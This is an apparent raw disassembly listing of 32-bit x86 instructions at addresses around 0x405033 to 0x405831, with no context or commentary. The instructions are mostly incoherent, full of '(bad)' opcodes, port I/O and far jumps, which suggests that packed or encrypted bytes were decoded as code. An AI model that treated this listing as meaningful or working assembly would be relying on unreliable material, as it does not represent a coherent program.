  405033:	(bad)  
  405034:	fidivr WORD PTR [eax-0x3b858e03]
  40503a:	addr16 repz pop ebx
  40503d:	sub    al,0x57
  40503f:	mov    di,0x847a
  405043:	out    0x6d,al
  405045:	dec    edi
  405046:	ja     0x404ff1
  405048:	out    0x18,al
  40504a:	outs   dx,BYTE PTR ds:[esi]
  40504b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40504c:	and    edx,DWORD PTR [ebp-0x2bda6098]
  405052:	in     eax,0xb4
  405054:	and    al,0xd3
  405056:	dec    eax
  405057:	bound  edx,QWORD PTR [ecx-0x57]
  40505a:	stos   DWORD PTR es:[edi],eax
  40505b:	or     DWORD PTR [esp+edi*4+0x2f7e790a],edx
  405062:	and    eax,0x6acfcabd
  405067:	aad    0xac
  405069:	sahf   
  40506a:	pop    edi
  40506b:	add    al,0x33
  40506d:	mov    edi,0x9329c0bb
  405072:	imul   esp,DWORD PTR [edx+0xa],0x3543439d
  405079:	jmp    0x32737851
  40507e:	out    0x81,al
  405080:	jmp    0x43d9:0x95e1918d
  405087:	test   eax,0x66596a6e
  40508c:	mov    ah,0x60
  40508e:	(bad)  
  40508f:	jmp    0x405100
  405091:	lahf   
  405092:	or     al,BYTE PTR [ebp+0x530310ca]
  405098:	xchg   edi,eax
  405099:	jmp    0xe4a0:0xcc3d91d5
  4050a0:	xchg   edx,eax
  4050a1:	bound  ebp,QWORD PTR [ecx]
  4050a3:	rcr    ch,0xca
  4050a6:	outs   dx,BYTE PTR ds:[esi]
  4050a7:	cmp    eax,0xb82c05f6
  4050ac:	mov    bh,BYTE PTR [ebp-0x622a19f3]
  4050b2:	sbb    DWORD PTR [edx-0x3d],esi
  4050b5:	xchg   BYTE PTR [edx],bh
  4050b7:	aas    
  4050b8:	xchg   edx,eax
  4050b9:	cmp    BYTE PTR [edi-0x3141d4ec],0x43
  4050c0:	push   edx
  4050c1:	mov    DWORD PTR [edx+eax*4-0x20dcb369],eax
  4050c8:	dec    edi
  4050c9:	sahf   
  4050ca:	scas   eax,DWORD PTR es:[edi]
  4050cb:	push   ss
  4050cc:	jmp    0x6894:0x18d627f7
  4050d3:	stos   BYTE PTR es:[edi],al
  4050d4:	add    al,0x7d
  4050d6:	lods   al,BYTE PTR ds:[esi]
  4050d7:	inc    DWORD PTR [edx]
  4050d9:	sbb    al,0xb9
  4050db:	dec    ebx
  4050dc:	ror    BYTE PTR [ebx+0x2e54ed4b],0xb3
  4050e3:	cmp    ah,BYTE PTR [edi-0x21]
  4050e6:	(bad)  
  4050e7:	lods   al,BYTE PTR ds:[esi]
  4050e8:	in     al,0x12
  4050ea:	into   
  4050eb:	cmp    ah,BYTE PTR [ecx+eiz*4]
  4050ee:	sub    BYTE PTR [eax-0x2e],bh
  4050f1:	jl     0x40512b
  4050f3:	mov    al,0xdd
  4050f5:	(bad)  
  4050f6:	in     al,0x6a
  4050f8:	ret    0xf5be
  4050fb:	inc    ecx
  4050fc:	mov    ebx,0x90c46777
  405101:	jnp    0x405171
  405103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405104:	int    0x73
  405106:	mov    DWORD PTR [edx+eiz*8+0xd462b9c],0x679a2352
  405111:	leave  
  405112:	ja     0x4050ae
  405114:	aaa    
  405115:	jmp    0x405120
  405117:	fiadd  WORD PTR [ebx]
  405119:	int3   
  40511a:	lea    edx,[ebp-0x48]
  40511d:	mov    al,ds:0xa209fad6
  405122:	test   al,0x3a
  405124:	dec    edi
  405125:	fs mov esi,0x8e9ef15e
  40512b:	inc    ebp
  40512c:	rcr    DWORD PTR [ecx-0x58],cl
  40512f:	pop    ds
  405130:	mov    ah,0x31
  405132:	xor    al,0xaf
  405134:	cli    
  405135:	sub    dl,BYTE PTR [esi-0x1]
  405138:	jl     0x40518a
  40513a:	test   eax,0x1833529d
  40513f:	add    edx,DWORD PTR [ebx-0x50]
  405142:	hlt    
  405143:	jecxz  0x405105
  405145:	iret   
  405146:	and    al,0x29
  405148:	in     eax,0x5
  40514a:	call   0xc833:0x91caec49
  405151:	pop    ecx
  405152:	jg     0x40518e
  405154:	adc    DWORD PTR [ebp+0x1],eax
  405157:	push   ebp
  405158:	add    ah,ch
  40515a:	and    al,0xbd
  40515c:	inc    ecx
  40515d:	inc    BYTE PTR [ecx]
  40515f:	test   DWORD PTR [ebx],esp
  405161:	fcomip st,st(5)
  405163:	retf   
  405164:	mov    ds:0x12b76207,eax
  405169:	ds repnz pushf 
  40516c:	or     edx,DWORD PTR [ecx+0xd]
  40516f:	dec    esi
  405170:	les    edi,FWORD PTR [edx+0x7a]
  405173:	add    BYTE PTR [ecx],al
  405175:	mov    WORD PTR [edx],cs
  405177:	sbb    al,0xe8
  405179:	pop    ecx
  40517a:	sub    al,0x8f
  40517c:	mov    al,ds:0xf44a1645
  405181:	aad    0x67
  405183:	mov    ds:0xa7d10d2d,al
  405189:	ds stc 
  40518b:	jmp    0x780b:0x4708c1c5
  405192:	push   esi
  405193:	sub    eax,0xf4523576
  405198:	add    al,0x7c
  40519b:	pushf  
  40519c:	call   0x79623dab
  4051a1:	jl     0x405142
  4051a3:	push   ss
  4051a4:	add    ebx,DWORD PTR [esi+0xa]
  4051a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a8:	pop    ebp
  4051a9:	fldcw  WORD PTR [ecx+0x81d2e48]
  4051af:	in     al,0x33
  4051b1:	jl     0x4051f5
  4051b3:	pop    ebx
  4051b4:	cmp    DWORD PTR [ebp+0x65b140e8],0x469d96ee
  4051be:	sbb    ebp,DWORD PTR [ebx-0x395e3a90]
  4051c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c5:	gs inc esi
  4051c7:	rcl    BYTE PTR [edx+0x3f],cl
  4051ca:	das    
  4051cb:	jl     0x4051a8
  4051cd:	es rcr eax,1
  4051d0:	push   cs
  4051d1:	sub    bh,dh
  4051d3:	imul   esp,eax,0xc0cf820a
  4051d9:	fld    DWORD PTR [ebp+ecx*1-0x48]
  4051dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051de:	mov    ds:0xae67923b,al
  4051e3:	call   DWORD PTR [eax]
  4051e5:	and    eax,DWORD PTR [esi-0x3e]
  4051e8:	shr    BYTE PTR [ecx],cl
  4051ea:	inc    esi
  4051eb:	fisub  DWORD PTR [esp+edi*4+0x6a]
  4051ef:	xor    edx,DWORD PTR [esi-0x9]
  4051f2:	sub    dh,dl
  4051f4:	and    dh,BYTE PTR [ebx-0x38]
  4051f7:	das    
  4051f8:	xor    DWORD PTR [esi],0xffffff93
  4051fb:	aas    
  4051fc:	test   DWORD PTR [ebx+ebx*4-0x23fb7041],edx
  405203:	loopne 0x405278
  405205:	js     0x405240
  405207:	pusha  
  405208:	push   cs
  405209:	fcom   DWORD PTR ds:0x993289a6
  40520f:	jns    0x405210
  405211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405212:	sti    
  405213:	scas   al,BYTE PTR es:[edi]
  405214:	es shl bh,1
  405217:	dec    esi
  405218:	pushf  
  405219:	add    dl,BYTE PTR gs:[edi-0x27]
  40521d:	sub    cl,BYTE PTR [esi-0x23]
  405220:	out    dx,al
  405221:	and    ch,BYTE PTR [ebx-0x57b4b44f]
  405227:	outs   dx,BYTE PTR ds:[esi]
  405228:	and    eax,0x5179907f
  40522d:	out    0x66,eax
  40522f:	jl     0x40526c
  405231:	xchg   esp,eax
  405232:	and    DWORD PTR [eax],edi
  405234:	mov    bh,0xa1
  405236:	adc    al,0x7
  405238:	fidiv  DWORD PTR ds:0xcbe120d5
  40523e:	xchg   edx,eax
  40523f:	pop    edx
  405240:	arpl   WORD PTR [ebx],ax
  405242:	xchg   ebp,eax
  405243:	push   eax
  405244:	adc    eax,0x8b1314ce
  405249:	retf   
  40524a:	mov    WORD PTR [ebp-0x60271d4],?
  405250:	jb     0x405216
  405252:	jl     0x4051e8
  405254:	and    ah,al
  405256:	jl     0x4052bb
  405258:	push   ss
  405259:	clc    
  40525a:	adc    DWORD PTR [ecx+0x5297b55a],ecx
  405260:	std    
  405261:	inc    ebp
  405262:	push   esp
  405263:	pop    edx
  405264:	ds and bh,al
  405267:	lods   eax,DWORD PTR ds:[esi]
  405268:	jnp    0x40529c
  40526a:	je     0x405243
  40526c:	repnz sar DWORD PTR [esi-0x5e],0x16
  405271:	jmp    0x735f7753
  405276:	(bad)  
  405277:	test   eax,0xc683b935
  40527c:	xchg   ecx,eax
  40527d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40527e:	add    BYTE PTR [edi+0x24],al
  405281:	mov    eax,0xb28a1c7f
  405286:	fidiv  WORD PTR [ebp-0x279a4707]
  40528c:	adc    BYTE PTR [ebp-0x5],0xbd
  405290:	xchg   edx,eax
  405291:	push   ebp
  405292:	test   ch,0x8
  405295:	repnz push ebx
  405297:	inc    edi
  405298:	out    0xa5,eax
  40529a:	fst    QWORD PTR [eax+edx*1]
  40529d:	not    eax
  40529f:	push   eax
  4052a0:	mov    dh,0x18
  4052a2:	mov    al,0x66
  4052a4:	xor    eax,0x69f1022
  4052a9:	jp     0x40526e
  4052ab:	jo     0x4052ca
  4052ad:	cmp    DWORD PTR [edx-0x33b7bc69],esi
  4052b3:	loope  0x405247
  4052b5:	mov    ch,0x2d
  4052b7:	jbe    0x405300
  4052b9:	mov    bh,0xe9
  4052bb:	mov    edi,0x609569d9
  4052c0:	data16 outs dx,BYTE PTR ds:[esi]
  4052c2:	pop    ds
  4052c3:	mov    ah,0xad
  4052c5:	ins    BYTE PTR es:[edi],dx
  4052c6:	inc    esi
  4052c7:	cmp    ecx,DWORD PTR [eax+0x31]
  4052ca:	retf   0xdb7d
  4052cd:	sub    dl,dl
  4052cf:	in     al,dx
  4052d0:	cdq    
  4052d1:	jo     0x405278
  4052d3:	fld    TBYTE PTR [edi-0x4c510e10]
  4052d9:	imul   edx,DWORD PTR [edx],0xafb24956
  4052df:	nop
  4052e0:	dec    edx
  4052e1:	leave  
  4052e2:	inc    ecx
  4052e3:	fild   QWORD PTR [edi-0x33048ed2]
  4052e9:	ss sar bl,0xee
  4052ed:	dec    eax
  4052ee:	or     esi,DWORD PTR [ebx]
  4052f0:	push   es
  4052f1:	jle    0x405340
  4052f3:	repz in al,dx
  4052f5:	and    edi,DWORD PTR [edi+0x4c06e1e6]
  4052fb:	cmovno ebp,DWORD PTR [ecx+ebp*2+0x59]
  405300:	call   0x7c79b02a
  405305:	jne    0x405370
  405307:	jo     0x4052e2
  405309:	or     ecx,DWORD PTR [eax-0x7b]
  40530c:	mov    ebp,0x19e15fb2
  405311:	fcomp  QWORD PTR [eax]
  405313:	pop    ebx
  405314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405315:	ds push 0x419816c0
  40531b:	mov    DWORD PTR [edx],ecx
  40531d:	into   
  40531e:	inc    eax
  40531f:	mov    BYTE PTR [edi+eiz*2-0x27],cl
  405323:	push   ebp
  405324:	(bad)  
  405325:	sub    BYTE PTR [edi+0x44504fe1],bl
  40532b:	cmp    esi,DWORD PTR [ebx]
  40532d:	add    dh,dh
  40532f:	cwde   
  405330:	cli    
  405331:	pop    eax
  405332:	cwde   
  405333:	loop   0x405384
  405335:	ins    DWORD PTR es:[edi],dx
  405336:	xchg   ecx,eax
  405337:	mov    ?,ebp
  405339:	xchg   ebx,eax
  40533a:	or     al,0xf8
  40533c:	out    0x21,al
  40533e:	xchg   ebx,eax
  40533f:	jno    0x40539f
  405341:	inc    edi
  405342:	hlt    
  405343:	out    0xc0,al
  405345:	or     DWORD PTR [ebx],ebp
  405347:	popf   
  405348:	pop    edx
  405349:	xchg   esp,eax
  40534a:	das    
  40534b:	or     BYTE PTR [edi],0xcf
  40534e:	push   eax
  40534f:	xor    ebx,DWORD PTR [edx+eax*4]
  405352:	or     BYTE PTR [edi],cl
  405354:	imul   ebp,DWORD PTR [eax+0x75],0xffffffeb
  405358:	popf   
  405359:	push   ds
  40535a:	cmp    cl,BYTE PTR [si-0x34]
  40535e:	loope  0x405378
  405360:	pop    ebx
  405361:	xlat   BYTE PTR ds:[ebx]
  405362:	idiv   BYTE PTR [eax]
  405364:	dec    edx
  405365:	jge    0x40537d
  405367:	sbb    DWORD PTR [edx+0x32306dab],edi
  40536d:	popf   
  40536e:	xchg   esi,eax
  40536f:	popa   
  405370:	inc    esp
  405371:	push   esi
  405372:	jmp    0x12a3:0x5f912e09
  405379:	xor    eax,0x19db3ff2
  40537e:	dec    BYTE PTR [ebx+0x5d635f6c]
  405384:	setbe  BYTE PTR [edi-0x2f88d5bc]
  40538b:	(bad)  
  40538d:	out    dx,eax
  40538e:	add    al,0x9
  405390:	pop    esi
  405391:	pop    esi
  405392:	data16 sub al,0x94
  405395:	pop    es
  405396:	push   ecx
  405397:	outs   dx,DWORD PTR ds:[esi]
  405398:	(bad)  
  405399:	out    dx,eax
  40539a:	test   DWORD PTR [ebx+edx*2-0x10],ebx
  40539e:	jmp    0x74822b8d
  4053a3:	fisttp DWORD PTR [eax+0x2a2eed23]
  4053a9:	xor    BYTE PTR [edi],cl
  4053ab:	aam    0xc0
  4053ad:	cmp    ebp,DWORD PTR [ecx]
  4053af:	imul   ebp
  4053b1:	(bad)  
  4053b2:	push   cs
  4053b3:	push   ebx
  4053b4:	sbb    eax,DWORD PTR [ebx+eax*2+0x67]
  4053b8:	mov    al,ds:0x544f6e6e
  4053bd:	call   0xd1933bee
  4053c2:	or     BYTE PTR [ebp-0x44c92c5c],0x82
  4053c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ca:	in     al,0x31
  4053cc:	fadd   QWORD PTR [ebx-0x6f]
  4053cf:	loop   0x4053ec
  4053d1:	cmp    al,0xf9
  4053d3:	push   ebx
  4053d4:	sbb    dh,BYTE PTR [eax+ebx*1-0xa76eec3]
  4053db:	icebp  
  4053dc:	cmp    al,0xe7
  4053de:	dec    ecx
  4053df:	jne    0x405445
  4053e1:	(bad)  
  4053e4:	jmp    0x52d745e3
  4053e9:	inc    ebp
  4053ea:	push   esi
  4053eb:	add    al,0x37
  4053ed:	(bad)  
  4053ee:	fisttp DWORD PTR ds:0xe5f27f36
  4053f4:	pop    ebx
  4053f5:	(bad)  
  4053f7:	xor    BYTE PTR [ecx+0x56],0xdf
  4053fb:	inc    edi
  4053fc:	mov    ecx,ebx
  4053fe:	xor    bh,BYTE PTR [ebx-0x41]
  405401:	pop    ds
  405402:	pushf  
  405403:	out    dx,eax
  405404:	imul   eax,ebx,0xffffffac
  405407:	mov    cl,0x51
  405409:	mov    eax,ds:0x9becd05
  40540e:	into   
  40540f:	jae    0x40545e
  405411:	or     dl,ch
  405413:	xchg   edx,eax
  405414:	add    ebx,0xee699d4
  40541a:	adc    ah,BYTE PTR [edi]
  40541c:	(bad)  
  40541d:	je     0x4053d5
  40541f:	shl    BYTE PTR cs:[ebx],1
  405422:	test   cl,cl
  405424:	test   BYTE PTR [edx],ah
  405426:	mov    edx,0x99c03040
  40542b:	lea    edx,ds:0x69ef54e8
  405431:	sti    
  405432:	stc    
  405433:	and    esp,ebx
  405435:	cmp    ah,al
  405437:	sahf   
  405438:	dec    edi
  405439:	push   esi
  40543a:	xchg   DWORD PTR [ebp-0x28],ecx
  40543d:	xchg   edx,eax
  40543e:	shr    DWORD PTR [edi-0xfdd2c13],0xac
  405445:	adc    BYTE PTR [ecx],0x7b
  405448:	test   eax,0xdf03810b
  40544d:	cli    
  40544e:	sti    
  40544f:	pop    ecx
  405450:	jae    0x4054aa
  405452:	xchg   ebp,eax
  405453:	mov    edi,DWORD PTR [edx-0x60d54291]
  405459:	xor    eax,0x88ea7d88
  40545e:	imul   ecx,DWORD PTR [ecx+0x64],0x5314ddf2
  405465:	xor    DWORD PTR [eax-0x32dff552],0x74d99865
  40546f:	sub    edx,DWORD PTR [esi]
  405471:	pop    esp
  405472:	mov    esi,0xd8fdde67
  405477:	and    BYTE PTR [eax-0x4764826b],dl
  40547d:	call   0x55868e3a
  405482:	gs inc esp
  405484:	adc    bl,BYTE PTR [edx+0xc51d5fa]
  40548a:	addr16 int 0x92
  40548d:	pushf  
  40548e:	fild   QWORD PTR [ebx]
  405490:	mov    dh,0xc9
  405492:	jl     0x405420
  405494:	push   cs
  405495:	push   ebp
  405496:	xchg   edi,eax
  405497:	or     DWORD PTR [eax+0x9430d9d],eax
  40549d:	nop
  40549e:	out    0x5c,eax
  4054a0:	test   BYTE PTR [ecx-0x7904d3e2],dh
  4054a6:	and    al,0xc2
  4054a8:	rep outs dx,DWORD PTR ds:[esi]
  4054aa:	(bad)  
  4054ab:	cmp    esp,esp
  4054ad:	pop    eax
  4054ae:	(bad)  
  4054b0:	es mov edx,0xf7934257
  4054b6:	add    DWORD PTR [ebx],ebp
  4054b8:	jmp    0x930e6c3d
  4054bd:	out    0xd6,al
  4054bf:	push   es
  4054c0:	into   
  4054c1:	aas    
  4054c2:	mov    bl,0xfc
  4054c4:	or     al,0x7e
  4054c6:	test   eax,ecx
  4054c8:	lods   eax,DWORD PTR ds:[esi]
  4054c9:	xlat   BYTE PTR ds:[ebx]
  4054ca:	mov    ah,0x36
  4054cc:	in     al,0x6b
  4054ce:	enter  0x9d78,0xed
  4054d2:	cmc    
  4054d3:	add    eax,DWORD PTR [edx-0x34]
  4054d6:	mov    eax,ds:0x3dddd2b4
  4054db:	repnz fstp QWORD PTR [edx]
  4054de:	ds xchg edx,eax
  4054e0:	iret   
  4054e1:	inc    edx
  4054e2:	call   0x5fbcf107
  4054e7:	mov    fs,WORD PTR [edx]
  4054e9:	mov    edx,0xfff9eb57
  4054ee:	test   BYTE PTR [ebx-0x34],dl
  4054f1:	test   eax,0xa72f1f93
  4054f6:	stos   BYTE PTR es:[edi],al
  4054f7:	jno    0x405509
  4054f9:	fwait
  4054fa:	xor    bl,bh
  4054fc:	imul   edi,DWORD PTR [eax],0x50
  4054ff:	mul    BYTE PTR [eax*1+0x35f3f3f2]
  405506:	sbb    dh,BYTE PTR [ecx]
  405508:	jae    0x4054f0
  40550a:	pop    ds
  40550b:	gs push ss
  40550d:	xchg   edx,eax
  40550e:	sub    al,0x2a
  405510:	dec    esi
  405511:	hlt    
  405512:	push   0xffffffa2
  405514:	cmp    ch,bh
  405516:	addps  xmm3,XMMWORD PTR [esp+edi*2-0x73]
  40551b:	test   DWORD PTR [eax-0x1],ebp
  40551e:	(bad)  
  40551f:	dec    DWORD PTR [ecx+0x6e9f845]
  405525:	add    eax,0xcdc70000
  40552a:	ret    0xda3f
  40552d:	ror    ecx,cl
  40552f:	aad    0xc0
  405531:	or     al,0x38
  405533:	lds    esp,FWORD PTR [edi+0x129e87d7]
  405539:	cmp    BYTE PTR [eax+0x78],bh
  40553c:	push   0x7c
  40553e:	js     0x4055b8
  405540:	mov    dl,0xb8
  405542:	mov    ds:0x9d5c6d39,eax
  405547:	sbb    DWORD PTR [edx+ecx*2+0x4fcefe0d],edi
  40554e:	rcr    ebx,0xa7
  405551:	data16 fmul DWORD PTR [ebp-0x6d90d993]
  405558:	rcr    DWORD PTR [ebx+eax*2],0x1d
  40555c:	popf   
  40555d:	cdq    
  40555e:	(bad)  
  40555f:	in     eax,dx
  405560:	dec    ebp
  405561:	dec    esi
  405562:	out    dx,eax
  405563:	inc    esi
  405564:	repnz mov esp,DWORD PTR [ecx+0x68]
  405568:	test   BYTE PTR ss:[edi+edi*4],0x3
  40556d:	push   ss
  40556e:	arpl   WORD PTR [ecx],cx
  405570:	loop   0x405536
  405572:	push   edx
  405573:	or     esi,DWORD PTR [eax+0x48]
  405576:	or     eax,0x4f1f3a02
  40557b:	xor    eax,DWORD PTR [ecx+0x34]
  40557e:	or     dl,dh
  405580:	adc    dl,0xd0
  405583:	inc    eax
  405584:	test   al,0x9b
  405586:	call   0xca8f:0xa8778d19
  40558d:	jnp    0x4055c0
  40558f:	leave  
  405590:	mov    bl,0xb1
  405592:	push   es
  405593:	xchg   edx,eax
  405595:	push   ss
  405596:	push   es
  405597:	add    al,0x35
  405599:	mov    edx,0x2f6a7f1f
  40559e:	call   0x52b9:0x8b9351e9
  4055a5:	repz and BYTE PTR [ecx-0x68],dl
  4055a9:	jno    0x405544
  4055ab:	and    ch,BYTE PTR [esi+0x39657ad0]
  4055b1:	xchg   BYTE PTR [eax-0x180696e],dh
  4055b7:	xor    bh,ch
  4055b9:	int    0x97
  4055bb:	mov    bl,0x74
  4055bd:	imul   ebx,edx,0x4c
  4055c0:	fwait
  4055c1:	stc    
  4055c2:	adc    eax,0x65b6cf3f
  4055c7:	call   0x9cd8:0xd861f445
  4055ce:	jne    0x4055b4
  4055d0:	mov    ebp,0xb1568682
  4055d5:	ins    BYTE PTR es:[edi],dx
  4055d6:	jp     0x405657
  4055d8:	test   BYTE PTR [ebx+0x2],cl
  4055db:	out    dx,al
  4055dc:	jg     0x405603
  4055de:	mov    edi,0x39e6e651
  4055e3:	popa   
  4055e4:	inc    eax
  4055e5:	icebp  
  4055e6:	pop    ds
  4055e7:	or     edi,DWORD PTR [ecx+0x1f]
  4055ea:	fwait
  4055eb:	lahf   
  4055ec:	lds    esp,FWORD PTR [eax-0x46d5f009]
  4055f2:	sbb    esi,esi
  4055f4:	mov    ebp,0xfa5255c8
  4055f9:	pushf  
  4055fa:	call   0xddb6:0xb86797dc
  405601:	xchg   ebx,eax
  405602:	(bad)  
  405603:	mov    ds:0x493ed31a,eax
  405608:	popf   
  405609:	xchg   ebx,eax
  40560a:	push   ebx
  40560b:	mov    ah,BYTE PTR [eax+edi*8+0x4d3d8409]
  405612:	setle  BYTE PTR [eax+0x3a]
  405616:	(bad)  
  405617:	pop    edx
  405618:	test   DWORD PTR [edi+0x15a4cc98],esi
  40561e:	stc    
  40561f:	jmp    0x800e:0xaf89d437
  405626:	dec    DWORD PTR [esi]
  405628:	fbstp  TBYTE PTR [edx]
  40562a:	and    cl,BYTE PTR [edi-0x6b]
  40562d:	mov    WORD PTR [ebx-0x23c12281],ds
  405633:	rol    BYTE PTR [edi+ebp*4],cl
  405636:	fsubrp st(7),st
  405638:	mov    DWORD PTR [ebp+eax*8-0x3],ebx
  40563c:	ss sub dh,bh
  40563f:	push   edi
  405640:	jno    0x405617
  405642:	lods   eax,DWORD PTR ds:[esi]
  405643:	lds    edx,FWORD PTR [eax+eiz*8-0x3d]
  405647:	(bad)  
  405648:	(bad)  
  405649:	or     BYTE PTR ds:[ebp+0x6a],ch
  40564d:	inc    ebp
  40564e:	pusha  
  40564f:	jno    0x40563b
  405651:	pop    ebp
  405652:	xchg   edi,eax
  405653:	jne    0x405628
  405655:	mov    eax,ds:0x7fa2e384
  40565a:	fcomp  st(4)
  40565c:	push   0x72
  40565e:	or     BYTE PTR [ebx],dh
  405660:	bound  eax,QWORD PTR [eax]
  405662:	aaa    
  405663:	fucomp st(6)
  405665:	fimul  WORD PTR [esi-0x54]
  405668:	jb     0x405648
  40566a:	mov    al,ds:0x4413282d
  40566f:	or     al,0xdb
  405671:	aam    0xbc
  405673:	js     0x4056ed
  405675:	test   edi,ecx
  405677:	aas    
  405678:	cmp    DWORD PTR [eax+ebp*1],eax
  40567b:	sbb    eax,0x56ec5f24
  405680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405681:	and    eax,0xdeaec5e5
  405686:	xchg   DWORD PTR [eax-0x22],edx
  405689:	sbb    eax,esi
  40568b:	aad    0x34
  40568d:	fcmovne st,st(4)
  40568f:	and    al,0x7b
  405691:	jl     0x4056b8
  405693:	sbb    edi,DWORD PTR [ebx]
  405695:	mov    dh,0xbf
  405697:	test   BYTE PTR [eax-0x3a],0x89
  40569b:	test   bh,ch
  40569d:	mov    edx,0xfdd057f5
  4056a2:	rol    eax,cl
  4056a4:	xchg   esi,eax
  4056a5:	inc    esp
  4056a6:	xor    dl,BYTE PTR [eax]
  4056a8:	push   edx
  4056a9:	mov    ds:0xb644f4c0,eax
  4056ae:	pop    ebp
  4056af:	out    dx,eax
  4056b0:	pop    edx
  4056b1:	sbb    al,0xa
  4056b3:	cs sub bl,dh
  4056b6:	xor    DWORD PTR [ecx],edi
  4056b8:	dec    ebx
  4056b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ba:	mov    ss,WORD PTR [ecx]
  4056bc:	push   edi
  4056bd:	fdiv   st(3),st
  4056bf:	outs   dx,DWORD PTR ds:[esi]
  4056c0:	pop    esp
  4056c1:	mov    ebp,0xf3b6b4d3
  4056c6:	jnp    0x405678
  4056c8:	fcom   st(0)
  4056ca:	je     0x405703
  4056cc:	mov    edi,DWORD PTR [esi-0x17baf868]
  4056d2:	jp     0x405677
  4056d4:	xor    BYTE PTR [ebp-0x56],dl
  4056d7:	xchg   edx,eax
  4056d8:	neg    DWORD PTR [esp+eiz*2-0x42]
  4056dc:	adc    eax,0xeb0efe38
  4056e1:	loopne 0x40572f
  4056e3:	jo     0x405750
  4056e5:	or     eax,0xb0599220
  4056ea:	aad    0xf6
  4056ec:	mov    eax,ds:0xc6bd8da2
  4056f1:	aad    0x60
  4056f3:	and    eax,0xa67ef1e9
  4056f8:	ja     0x40573b
  4056fa:	pop    edi
  4056fb:	sub    eax,0xde190ab7
  405700:	inc    edi
  405701:	scas   al,BYTE PTR es:[edi]
  405702:	retf   0x52d1
  405705:	leave  
  405706:	loop   0x405780
  405708:	xor    bh,0x90
  40570b:	xchg   ebx,eax
  40570c:	(bad)  
  40570d:	push   eax
  40570e:	inc    ebx
  40570f:	scas   eax,DWORD PTR es:[edi]
  405710:	xor    eax,0x70bb6279
  405715:	xchg   ecx,eax
  405716:	push   ss
  405717:	pop    edx
  405718:	and    ah,BYTE PTR [edi+0x7cca39a1]
  40571e:	sbb    BYTE PTR [ebp-0x18be3fed],0xd
  405725:	ret    0xf342
  405728:	mov    eax,ds:0x2e5e6c87
  40572d:	mov    ds:0xf0512429,eax
  405732:	retf   0xf7e0
  405735:	pop    eax
  405736:	pop    esp
  405737:	ret    0xce2d
  40573a:	retf   
  40573b:	jne    0x4056ff
  40573d:	stc    
  40573e:	add    al,0x4e
  405740:	xchg   esi,eax
  405741:	pusha  
  405742:	adc    al,0xbb
  405744:	dec    ecx
  405745:	popf   
  405746:	mov    ecx,0x474d2c28
  40574b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40574c:	lea    ecx,[ecx+eiz*1+0x5db0255d]
  405753:	push   ebx
  405754:	xor    DWORD PTR ds:0x5bca527b,edi
  40575a:	push   eax
  40575b:	bound  ecx,QWORD PTR [ebx+esi*4-0x19dcce89]
  405762:	(bad)  
  405763:	xlat   BYTE PTR ds:[ebx]
  405764:	inc    BYTE PTR [eax-0x125e19e8]
  40576a:	jecxz  0x405718
  40576c:	cmp    esi,DWORD PTR [ecx-0x1f13e58b]
  405772:	aam    0x3b
  405774:	mov    ds:0x42daf3a9,eax
  405779:	mov    edi,esi
  40577b:	xor    DWORD PTR [edx],esp
  40577d:	and    al,0xaf
  40577f:	int3   
  405780:	call   0x50ea:0x73d44a8d
  405787:	pop    ecx
  405788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405789:	stc    
  40578a:	int    0x9e
  40578c:	(bad)  
  40578d:	call   0x6309:0xe34e7ec4
  405794:	xchg   edi,eax
  405795:	cld    
  405796:	pusha  
  405797:	jb     0x4057eb
  405799:	sahf   
  40579a:	pop    es
  40579b:	scas   eax,DWORD PTR es:[edi]
  40579c:	mov    esi,0xeb16d270
  4057a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a2:	xor    DWORD PTR [esi-0x36],esi
  4057a5:	(bad)  
  4057a6:	pop    edx
  4057a7:	cli    
  4057a8:	imul   DWORD PTR [ebx]
  4057aa:	(bad)  
  4057ab:	sbb    DWORD PTR [edx+0x786ead87],esp
  4057b1:	scas   eax,DWORD PTR es:[edi]
  4057b2:	int3   
  4057b3:	lea    ebx,[ebp-0x107439a7]
  4057b9:	xor    al,0x8c
  4057bb:	jecxz  0x405815
  4057bd:	or     DWORD PTR [esi+edi*1+0x70],edx
  4057c1:	mov    dh,0x1
  4057c3:	jb     0x405823
  4057c5:	pop    edi
  4057c6:	lea    eax,[esi+0x725ba5d5]
  4057cc:	scas   eax,DWORD PTR es:[edi]
  4057cd:	and    ah,dh
  4057cf:	(bad)  
  4057d0:	pop    edi
  4057d1:	sbb    eax,0x41e0af24
  4057d6:	xor    eax,0x96236315
  4057db:	jns    0x4057fa
  4057dd:	xchg   ebp,eax
  4057de:	loop   0x4057fe
  4057e0:	mov    dh,0xec
  4057e2:	jp     0x405824
  4057e4:	es inc edx
  4057e6:	and    esi,DWORD PTR [ebp-0x9]
  4057e9:	scas   al,BYTE PTR es:[edi]
  4057ea:	stos   WORD PTR es:[edi],ax
  4057ec:	xchg   ebp,eax
  4057ed:	jns    0x405770
  4057ef:	push   cs
  4057f0:	pop    edi
  4057f1:	sbb    ch,BYTE PTR [ebp-0x33458cd]
  4057f7:	scas   al,BYTE PTR es:[edi]
  4057f8:	popa   
  4057f9:	jmp    0xc038cf06
  4057fe:	ss inc ebp
  405800:	inc    ebp
  405801:	mov    cl,BYTE PTR [eax+0x2c477664]
  405807:	and    dl,BYTE PTR [ebx-0x19733ea6]
  40580d:	jl     0x405827
  40580f:	iret   
  405810:	sub    bh,dl
  405812:	push   esp
  405813:	xor    eax,0xc6cfe2e8
  405818:	sbb    edx,DWORD PTR [ebx+ecx*1+0x5b]
  40581c:	fstp   QWORD PTR [ecx]
  40581e:	xor    BYTE PTR [ecx+edx*4],ah
  405821:	test   eax,0xbe02b291
  405826:	adc    eax,0xc2e604c6
  40582b:	xchg   esp,eax
  40582c:	push   0x48f7c960
  405831:	pop    ds
